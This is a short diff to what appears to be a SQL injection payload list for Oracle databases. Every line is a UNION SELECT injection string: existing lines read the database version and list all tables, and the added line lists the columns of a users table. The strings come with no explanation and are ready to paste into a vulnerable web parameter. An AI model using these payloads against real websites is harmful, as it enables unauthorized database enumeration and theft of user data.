@@ -1,2 +1,3 @@
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version-- oracle
 '+UNION+SELECT+table_name,NULL+FROM+all_tables-- oracle
++UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- oracle
